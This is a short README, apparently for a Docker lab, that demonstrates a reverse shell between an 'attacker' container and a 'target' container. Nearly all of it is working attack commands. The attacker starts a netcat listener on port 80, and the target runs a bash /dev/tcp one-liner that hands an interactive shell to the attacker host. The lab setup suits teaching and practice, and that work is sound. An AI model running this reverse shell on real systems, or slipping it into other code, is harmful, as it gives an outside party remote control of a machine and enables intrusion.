# Reversh shell

## With bash tcp

```bash
docker-compose up -d
```

```bash
docker exec -it reverseshell_attacker_1 bash
apt-get update
apt-get install -y netcat
nc -nvlp 80
```

```bash
docker exec -it reverseshell_target_1 bash
bash -i >& /dev/tcp/attacker/80 0>&1
```

```bash
docker-compose down
```
